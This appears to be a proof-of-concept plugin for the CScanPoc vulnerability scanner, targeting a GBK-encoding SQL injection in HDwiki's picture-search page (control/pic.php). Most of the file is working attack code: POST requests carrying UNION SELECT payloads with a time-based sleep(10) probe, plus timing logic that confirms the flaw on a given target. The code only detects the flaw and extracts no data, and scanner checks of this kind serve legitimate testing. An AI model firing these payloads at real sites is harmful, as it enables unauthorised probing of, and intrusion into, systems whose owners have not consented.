# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'HDwiki_0002'  # 平台漏洞编号，留空
    name = 'HDwiki gbk SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-02'  # 漏洞公布时间
    desc = '''
        在control/pic.php文件中，doseach方法中参数过滤不严谨导致的SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3351/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'HDwiki'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '63114e58-0109-46b0-bd8c-0fc28a5e7960'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ' /hdwiki/index.php?pic-search'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36',
            }
            data_sleep = "searchtext=%E7%9B%B8%e9%8c%a6'  UNION SELECT if(user()=user(),sleep(10),1)#&searchfull=%CD%BC%C6%AC%CB%D1%CB%F7"
            data_normal = "searchtext=%E7%9B%B8%e9%8c%a6'  UNION SELECT if(user()=user(),md5(c),1)#&searchfull=%CD%BC%C6%AC%CB%D1%CB%F7"
            url = self.target + payload
            time_start = time.time()
            requests.post(url, data=data_normal)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 9:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
